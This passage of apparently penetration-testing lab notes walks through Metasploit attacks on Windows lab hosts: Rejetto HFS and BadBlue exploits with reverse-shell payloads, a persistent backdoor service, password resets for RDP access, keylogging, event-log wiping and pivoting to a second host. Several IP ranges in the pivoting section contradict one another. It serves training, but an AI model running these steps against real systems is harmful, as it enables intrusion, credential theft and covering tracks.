[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### Exploitation <a href="#exploitation-2" id="exploitation-2"></a>

```bash
search type:exploit name:rejetto
use exploit/windows/http/rejetto_hfs_exec
options
set payload windows/x64/meterpreter/reverse_tcp
run
```

```bash
meterpreter > sysinfo
    Computer        : WIN-OMCNBKR66MN
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x64/windows
    
meterpreter > getuid 
    Server username: WIN-OMCNBKR66MN\Administrator
```

### Persistence <a href="#persistence" id="persistence"></a>

❗ In order to set up persistence, administrative privileges are required.

```bash
background
search platform:windows persistence
use exploit/windows/local/persistence_service
info
# Description:
#   This Module will generate and upload an executable to a remote host, 
#   next will make it a persistent service. It will create a new service 
#   which will start the payload whenever the service is running. Admin 
#   or system privilege is required.
set payload windows/meterpreter/reverse_tcp
set SESSION 1
exploit
```

<figure><img src="../../../../../.gitbook/assets/image (27) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Successful maintained access. Once the persistent backdoor is installed, it's going to continue to run (across restarts) as a service and a multi handler listening to a connection will receive a connection from the service.

<figure><img src="../../../../../.gitbook/assets/image (28) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
exit
sessions -K # Kill all sessions
```

<figure><img src="../../../../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>

* Regain access to the system

```bash
use multi/handler
options
# Set the options as specified for the PERSISTENCE_SERVICE Exploit
set payload windows/meterpreter/reverse_tcp
set LHOST eth1
set LPORT 4444
run
```

<figure><img src="../../../../../.gitbook/assets/image (30) (1).png" alt=""><figcaption></figcaption></figure>

* Exit `msfconsole` and repeat again the `multi/handler` process. Meterpreter session still able to be accessed.

***

## Lab 7 - [Enabling RDP](https://www.offsec.com/metasploit-unleashed/enabling-remote-desktop/) <a href="#lab-7-enabling-rdp" id="lab-7-enabling-rdp"></a>

> 🔬 [Windows: Enabling Remote Desktop](https://attackdefense.com/challengedetails?cid=1958)
>
> * Target IP: 10.0.17.50
> * Enable **RDP** on the target machine on port **`3389`**

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 10.0.17.50
workspace -a RDP
db_nmap -sV 10.0.17.50
```

```bash
[*] Nmap: Not shown: 990 closed ports
[*] Nmap: PORT      STATE SERVICE      VERSION
[*] Nmap: 80/tcp    open  http         BadBlue httpd 2.7
[*] Nmap: 135/tcp   open  msrpc        Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 49152/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49165/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49176/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

# Note that RDP port 3389 is disabled
```

### Exploitation <a href="#exploitation-3" id="exploitation-3"></a>

```
use exploit/windows/http/badblue_passthru
options
run
```

```bash
meterpreter > sysinfo
    Computer        : WIN-OMCNBKR66MN
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 0
    Meterpreter     : x86/windows
    
meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
```

### Enable RDP <a href="#enable-rdp" id="enable-rdp"></a>

```bash
search enable_rdp
use post/windows/manage/enable_rdp
options
sessions
set SESSION 1
run
```

<figure><img src="../../../../../.gitbook/assets/image (31) (1).png" alt=""><figcaption></figcaption></figure>

* Verify `port 3389` again and it now should be opened.

```bash
db_nmap -p 3389 10.0.17.50
```

<figure><img src="../../../../../.gitbook/assets/image (32) (1).png" alt=""><figcaption></figcaption></figure>

* To access RDP, login credentials are necessary

```bash
sessions
sessions 1
shell
net users
	Administrator Guest
```

<figure><img src="../../../../../.gitbook/assets/image (33) (1).png" alt=""><figcaption></figcaption></figure>

* Change the `Administrator` user's password (no recommended in a real-world system) because it can be suspected that the machine is being hacked easily.

> 📌 _During a standard Pentest, create another user account, add it to the Administrators group and utilize that one._

```bash
net user administrator hacker_123321
    net user administrator hacker_123321
    The command completed successfully.
exit
```

Legitimate credentials are now: `administrator`: `hacker_123321`

* In a new Terminal TAB

```bash
xfreerdp /u:administrator /p:hacker_123321 /v:10.0.17.50
```

<figure><img src="../../../../../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Flag: `763e1c86da26c66e86a8537fd343280d`
{% endhint %}

***

## Lab 8 - Keylogging <a href="#lab-8-keylogging" id="lab-8-keylogging"></a>

> 🔬 [Windows: File and Keylogging](https://attackdefense.com/challengedetails?cid=1955)
>
> * Target IP: `10.0.22.26`
> * Metasploit **keystroke sniffer**

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 10.0.22.26
workspace -a Keylogging
db_nmap -sV 10.0.22.26
```

```bash
[*] Nmap: Not shown: 990 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 80/tcp    open  http               BadBlue httpd 2.7
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49175/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### Exploitation <a href="#exploitation-4" id="exploitation-4"></a>

```bash
use exploit/windows/http/badblue_passthru
options
run
```

```bash
meterpreter > sysinfo
    Computer        : WIN-OMCNBKR66MN
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    
Meterpreter     : x86/windows
    meterpreter > getuid
    Server username: WIN-OMCNBKR66MN\Administrator
```

```bash
shell
cd /
type flag.txt
```

{% hint style="success" %}
Flag: `70a569da306697d64fc6c19afea37d94`
{% endhint %}

### Keylogging <a href="#keylogging" id="keylogging"></a>

```bash
meterpreter > pgrep explorer
    2508
    
meterpreter > migrate 2508
    [*] Migrating from 2896 to 2508...
    [*] Migration completed successfully.

meterpreter > help
    Stdapi: User interface Commands
    ===============================
    
        Command        Description
        -------        -----------
        enumdesktops   List all accessible desktops and window stations
        getdesktop     Get the current meterpreter desktop
        idletime       Returns the number of seconds the remote user has been idle
        keyboard_send  Send keystrokes
        keyevent       Send key events
        keyscan_dump   Dump the keystroke buffer
        keyscan_start  Start capturing keystrokes
        keyscan_stop   Stop capturing keystrokes
        mouse          Send mouse events
        screenshare    Watch the remote user's desktop in real time
        screenshot     Grab a screenshot of the interactive desktop
        setdesktop     Change the meterpreters current desktop
        uictl          Control some of the user interface components
```

* Open a `Notepad` session on the Target machine.
* On the Attacker machine, start the keystroke capture

```bash
meterpreter > keyscan_start 
    Starting the keystroke sniffer ...

meterpreter > keyscan_dump 
    Dumping captured keystrokes...
    <Caps Lock>U<Caps Lock>ser<Shift>:admin<CR>
    <Caps Lock>P<Caps Lock>assword<Shift>:12345
```

<figure><img src="../../../../../.gitbook/assets/image (38) (1).png" alt=""><figcaption></figcaption></figure>

* Stop the sniffer

```bash
meterpreter > keyscan_stop
    Stopping the keystroke sniffer...
```

***

## Lab 9 - Clearing Event Logs <a href="#lab-9-clearing-event-logs" id="lab-9-clearing-event-logs"></a>

> 🔬 Same as Lab 8 - [Windows: File and Keylogging](https://attackdefense.com/challengedetails?cid=1955)
>
> * Target IP: `10.2.26.66`
> * Metasploit **clearev** `Meterpreter` option

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 10.2.26.66
setg RHOST 10.2.26.66
workspace -a Clearenv
db_nmap -sV 10.2.26.66
```

```bash
[*] Nmap: Not shown: 991 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 80/tcp    open  http               BadBlue httpd 2.7
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### Exploitation <a href="#exploitation-5" id="exploitation-5"></a>

```bash
use exploit/windows/http/badblue_passthru
options
run
```

```bash
meterpreter > sysinfo
    Computer        : WIN-OMCNBKR66MN
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows
    
meterpreter > getuid
    Server username: WIN-OMCNBKR66MN\Administrator
```

* Change the administrator password and look for the event log.

```sh
shell
net user administrator Password_1234
```

<figure><img src="../../../../../.gitbook/assets/image (39) (1).png" alt=""><figcaption></figcaption></figure>

### Clearing Windows Event Logs <a href="#clearing-windows-event-logs" id="clearing-windows-event-logs"></a>

❗ _Elevated privileges are necessary to clean the Event logs._

* From the `Meterpreter` session clear the event log

```bash
meterpreter > clearev 
    [*] Wiping 259 records from Application...
    [*] Wiping 504 records from System...
    [*] Wiping 15901 records from Security...
```

<figure><img src="../../../../../.gitbook/assets/image (40) (1).png" alt=""><figcaption></figcaption></figure>

> 📌 Exploit files or executables need to be cleaned too.

***

## Lab 10 - [Pivoting](https://www.offsec.com/metasploit-unleashed/pivoting/) <a href="#lab-10-pivoting" id="lab-10-pivoting"></a>

> 🔬 [Pivoting](https://attackdefense.com/challengedetails?cid=2332)
>
> * Target 1 IP: `10.0.27.249`
> * Target 2 IP: `10.0.31.26`
> * **Pivoting** technique with a _network route_ to the internal network's subnet

```bash
ping 10.0.27.249
	PING 10.0.27.249 (10.0.27.249) 56(84) bytes of data.
	64 bytes from 10.0.27.249: icmp_seq=1 ttl=125 time=3.45 ms
	64 bytes from 10.0.27.249: icmp_seq=2 ttl=125 time=2.28 ms
	64 bytes from 10.0.27.249: icmp_seq=3 ttl=125 time=2.30 ms
	64 bytes from 10.0.27.249: icmp_seq=4 ttl=125 time=2.21 ms


ping 10.0.31.26
	PING 10.0.31.26 (10.0.31.26) 56(84) bytes of data.

# No response from target2
```

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
workspace -a Pivoting
db_nmap -sV 10.0.27.249
```

```bash
[*] Nmap: Not shown: 990 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 80/tcp    open  http               HttpFileServer httpd 2.3
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49165/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### Exploitation <a href="#exploitation-6" id="exploitation-6"></a>

```bash
search type:exploit name:rejetto
use exploit/windows/http/rejetto_hfs_exec
options
set RHOSTS 10.0.27.249
exploit
```

```bash
meterpreter > sysinfo
    Computer        : WIN-OMCNBKR66MN
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows
    
meterpreter > getuid
    Server username: WIN-OMCNBKR66MN\Administrator
    
meterpreter > ipconfig

    Interface  1
    ============
    Name         : Software Loopback Interface 1
    Hardware MAC : 00:00:00:00:00:00
    MTU          : 4294967295
    IPv4 Address : 127.0.0.1
    IPv4 Netmask : 255.0.0.0
    IPv6 Address : ::1
    IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
    
    
    Interface 12 # Victim Machine 1's IP
    ============
    Name         : AWS PV Network Device #0
    Hardware MAC : 06:37:15:4c:b5:09
    MTU          : 9001
    IPv4 Address : 10.0.27.249
    IPv4 Netmask : 255.255.240.0 # subnet mask = 20
    IPv6 Address : fe80::20:ee05:f78a:5177
    IPv6 Netmask : ffff:ffff:ffff:ffff::
    
    
    Interface 14
    ============
    Name         : Microsoft ISATAP Adapter
    Hardware MAC : 00:00:00:00:00:00
    MTU          : 1280
    IPv6 Address : fe80::5efe:a00:1bf9
    IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
```

* Target2 is on the same Target1 subnet - **`10.0.27.0/20`** (look at the Interface 12)
  * `10.0.27.0/20` = from `10.2.16.1` to `10.2.31.254`

### Pivoting <a href="#pivoting" id="pivoting"></a>

* From the attacker's machine, a route through "target1 `10.2.30.0/20` machine" is needed, to run MSF modules against target2 machine

```bash
run autoroute -s 10.0.27.0/20
```

```bash
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.0.27.0/255.255.240.0...
[+] Added route to 10.0.27.0/255.255.240.0 via 10.0.27.249
[*] Use the -p option to list all active routes
```

Now, subnet `10.0.27.0/20` can be accessed with `MSFconsole`

```bash
background
sessions -n victim-1 -i 1
```

<figure><img src="../../../../../.gitbook/assets/image (41) (1).png" alt=""><figcaption></figcaption></figure>

* Scan for open ports on the target2 system - `10.0.31.26`

```bash
search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.31.26
set PORTS 1-100
run
```

<figure><img src="../../../../../.gitbook/assets/image (42) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (43) (1).png" alt=""><figcaption></figcaption></figure>

> 📌 The route is only applicable to `MSFconsole`, not outside of it

### **Port Forwarding**

* To perform an `nmap` scan on target2, a port forwarding need to be set up.
  * **`e.g.`** forward the remote port `80` to an attacker machine local port, which will allow to perform a service version enumeration of the target2 service

```bash
msf6 auxiliary(scanner/portscan/tcp) > sessions 1
    [*] Starting interaction with victim-1...

meterpreter > portfwd add -l 1234 -p 80 -r 10.0.31.26
    [*] Local TCP relay created: :1234 <-> 10.0.31.26:80

meterpreter > background
    [*] Backgrounding session victim-1...
```

```bash
db_nmap -sS -sV -p 1234 localhost
```

<figure><img src="../../../../../.gitbook/assets/image (44) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (45) (1).png" alt=""><figcaption></figcaption></figure>

```bash
search type:exploit name:badblue
use exploit/windows/http/badblue_passthru
set payload windows/meterpreter/bind_tcp
set RHOSTS 10.2.21.166
set LPORT 4433
exploit
```

<figure><img src="../../../../../.gitbook/assets/image (46) (1).png" alt=""><figcaption></figcaption></figure>

* Note that the OS is different with the target 1 host and showing the ip address of target 2 `10.0.31.26`

```bash
meterpreter > sysinfo
    Computer        : ATTACKDEFENSE
    OS              : Windows 2016+ (10.0 Build 17763).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows
    
meterpreter > getuid
    Server username: ATTACKDEFENSE\Administrator
    
meterpreter > ipconfig

    Interface  1
    ============
    Name         : Software Loopback Interface 1
    Hardware MAC : 00:00:00:00:00:00
    MTU          : 4294967295
    IPv4 Address : 127.0.0.1
    IPv4 Netmask : 255.0.0.0
    IPv6 Address : ::1
    IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
    
    
    Interface  4 # Victim Machine 2's IP
    ============
    Name         : AWS PV Network Device #0
    Hardware MAC : 06:45:82:19:45:45
    MTU          : 9001
    IPv4 Address : 10.0.31.26
    IPv4 Netmask : 255.255.240.0
    IPv6 Address : fe80::60c1:22b:d2c9:5eb8
    IPv6 Netmask : ffff:ffff:ffff:ffff::
```

```bash
background
sessions -n target-2 -i 2
sessions
```

<figure><img src="../../../../../.gitbook/assets/image (47) (1).png" alt=""><figcaption></figcaption></figure>

```bash
sessions 2
shell
cd /
type flag.txt
```

<figure><img src="../../../../../.gitbook/assets/image (48) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Flag: `c46d12f28d87ae0b92b05ebd9fb8e817`
{% endhint %}
